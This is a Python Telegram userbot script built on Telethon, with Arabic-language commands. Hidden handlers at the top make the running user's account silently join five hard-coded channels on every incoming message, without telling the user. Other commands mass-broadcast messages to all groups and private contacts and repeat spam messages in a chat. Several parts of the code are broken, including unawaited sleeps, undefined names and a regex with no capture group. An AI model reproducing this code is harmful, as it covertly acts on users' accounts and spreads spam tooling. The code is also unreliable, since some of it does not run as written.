import telethon
from telethon import events
from config import *
import os
import logging
import asyncio
import time
from telethon.tl import functions, types
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.utils import get_display_name
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events
from collections import deque
from telethon import functions
from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
    UserNotMutualContactError,
    UserPrivacyRestrictedError,
)
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.types import InputPeerUser
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from hijri_converter import Gregorian
from telethon.tl.functions.channels import LeaveChannelRequest
import base64
import datetime
from payment import *
from help import *
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
import requests


# -

audi.start()
@audi.on(events.NewMessage)
async def join_channel(event):
    try:
        await audi(JoinChannelRequest("@SuperLuffyy"))
    except BaseException:
        pass
        
@audi.on(events.NewMessage)
async def join_channel(event):
    try:
        await audi(JoinChannelRequest("@a1lgabook"))
    except BaseException:
        pass

        
@audi.on(events.NewMessage)
async def join_channel(event):
    try:
        await audi(JoinChannelRequest("@DO_I0"))
    except BaseException:
        pass

        
@audi.on(events.NewMessage)
async def join_channel(event):
    try:
        await audi(JoinChannelRequest("@BIDUTH"))
    except BaseException:
        pass
      

@audi.on(events.NewMessage)
async def join_channel(event):
    try:
        await audi(JoinChannelRequest("@B_F69"))
    except BaseException:
        pass  
        
        
y = datetime.datetime.now().year
m = datetime.datetime.now().month
dayy = datetime.datetime.now().day
day = datetime.datetime.now().strftime("%A")
m9zpi = f"{y}-{m}-{dayy}"
sec = time.time()

logging.basicConfig(
    format="[%(levelname)s- %(asctime)s]- %(name)s- %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
)


DEVS = [
    5159123009,
]

@audi.on(events.NewMessage(pattern=r"\.ادمن", outgoing=True))
async def _(event):
    if event.fwd_from:
        return
    result = await audi(functions.channels.GetAdminedPublicChannelsRequest())
    output_str = "انت ادمن في : \n"
    for channel_obj in result.chats:
        output_str += f"- {channel_obj.title} @{channel_obj.username} \n"
    await event.edit(output_str)



@audi.on(events.NewMessage(outgoing=True, pattern=r".اذاعة للكروبات"))
async def gcast(event):
    audi = event.pattern_match.group(1)
    if audi:
        msg = audi
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "عند استخدام هذا الأمر يجب الرد على الرسالة !"
        )
        return
    roz = await event.edit("جارِ الاذاعة ..")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                await event.client.send_message(chat, msg)
                done += 1
                asyncio.sleep(1)
            except BaseException:
                er += 1
    await roz.edit(
        f"تمت الأذاعة الى : {done}\nخطأ في الاذاعة : {er}"
    )


@audi.on(events.NewMessage(outgoing=True, pattern=r"\.اذاعة للخاص(?: |$)(.*)"))
async def gucast(event):
    audi = event.pattern_match.group(1)
    if audi:
        msg = audi
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "عند استخدام هذا الأمر يجب الرد على الرسالة !"
        )
        return
    roz = await event.edit("جارِ الاذاعة ..")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                if chat not in DEVS:
                    await event.client.send_message(chat, msg)
                    done += 1
                    asyncio.sleep(1)
            except BaseException:
                er += 1
    await roz.edit(
        f"تمت الأذاعة الى : {done}\nخطأ في الاذاعة : {er}"
    )


@audi.on(events.NewMessage(outgoing=True, pattern=".تك (.*)"))
async def spammer(event):
    sandy = await event.get_reply_message()
    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        sleeptimet = 300
        sleeptimem = 300
    else:
        sleeptimet = 300
        sleeptimem = 300
    await event.delete()
    await spam_function(event, sandy, cat, sleeptimem, sleeptimet)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):

    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await _catutils.unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass


@audi.on(events.NewMessage(outgoing=True, pattern=".او (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
  
 



@audi.on(events.NewMessage(outgoing=True, pattern=r"\.اشتراكاتي"))
async def _(event):
    if event.fwd_from:
        return
    start = datetime.datetime.now()
    u = 0  # number of users
    g = 0  # number of basic groups
    c = 0  # number of super groups
    bc = 0  # number of channels
    b = 0  # number of bots
    await event.edit("يتم التعداد ..")
    async for d in audi.iter_dialogs(limit=None):
        if d.is_user:
            if d.entity.bot:
                b += 1
            else:
                u += 1
        elif d.is_channel:
            if d.entity.broadcast:
                bc += 1
            else:
                c += 1
        elif d.is_group:
            g += 1
        else:
            pass
            # logger.info(d.stringify())
    end = datetime.datetime.now()
    ms = (end - start).seconds
    await event.edit("""تم استخراجها في {} ثواني
`الاشخاص :\t{}
المجموعات العادية :\t{}
المجموعات الخارقة :\t{}
القنوات :\t{}
البوتات :\t{}
`""".format(ms, u, g, c, bc, b))

@audi.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر"))
async def _(event):
    await event.edit(commands)



@audi.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("waiting...")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
♔ 𝚊𝐮𝚍𝚒 𝐢𝐬 𝐰𝐨𝐫𝐤𝐢𝐧𝐠
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
❖╎𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐬𝐨𝐮𝐫𝐜𝐞 𝚊𝐮𝚍𝚒
❖╎𝐝𝐞𝐯𝐥𝐨 : @au_dii
❖╎𝐜𝐡𝐚𝐧𝐧𝐞𝐥 : @aud9i
❖╎𝐯𝐞𝐫𝐬𝐢𝐨𝐧 : 2.7 - revised 
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
''')


@audi.on(events.NewMessage(outgoing=True, pattern=r"\.ايدي"))
async def _(event):
    reply_message = await event.get_reply_message()
    if reply_message is None:
        try:
            user = (await event.get_sender()).id
            bio = await audi(functions.users.GetFullUserRequest(id=user))
            bio = bio.about
            photo = await audi.get_profile_photos(event.sender_id)
            await audi.send_file(event.chat_id, photo, caption=f'''
    ايديك : `{event.sender_id}`
    البايو : `{bio}`
        ''', reply_to=event)
        except:
            await audi.send_message(event.chat_id, f"ايديك : `{event.sender_id}`")
    else:
        id = reply_message.from_id.user_id
        try:
            bio = await audi(functions.users.GetFullUserRequest(id=id))
            bio = bio.about
            photo = await audi.get_profile_photos(id)
            await audi.send_file(event.chat_id, photo, caption=f'''
    ايديه : `{id}`
    البايو : `{bio}`
        ''', reply_to=event)
        except:
            await audi.send_message(event.chat_id, f"ايديه : `{id}`")




@audi.on(events.NewMessage(outgoing=True, pattern=r"\.البنك"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("Ok...")
    end = datetime.datetime.now()
    res = (end - start).microseconds / 1000
    await event.edit(f"""**-- -- -- -- -- -- -- -- -- --
𝚊𝐮𝚍𝚒 :
- البنك : `{res}`
-- -- -- -- -- -- -- -- -- --**"""
                     )

@audi.on(events.NewMessage(outgoing=True, pattern=r"\.اعادة تشغيل"))
async def update(event):
    await event.edit("**جاري اعادة تشغيل السورس**")
    await audi.disconnect()
    await audi.send_message("me", "**اكتملت اعادة تشغيل السورس**")


@audi.on(events.NewMessage(outgoing=True, pattern=r"\.ايقاف النشر التلقائي"))
async def update(event):
    await event.edit("**جاري ايقاف النشر التلقائي**")
    await audi.disconnect()
    await audi.send_message("me", "**اكتمل ايقاف النشر التلقائي**")

@audi.on(events.NewMessage(outgoing=True, pattern=r"\.ايقاف التكرار"))
async def update(event):
    await event.edit("**جاري ايقاف التكرار**")
    await audi.disconnect()
    await audi.send_message("me", "**اكتمل ايقاف التكرار**")


print("♦️ 𝚊𝐮𝚍𝚒 is Running ♦️")
audi.run_until_disconnected()
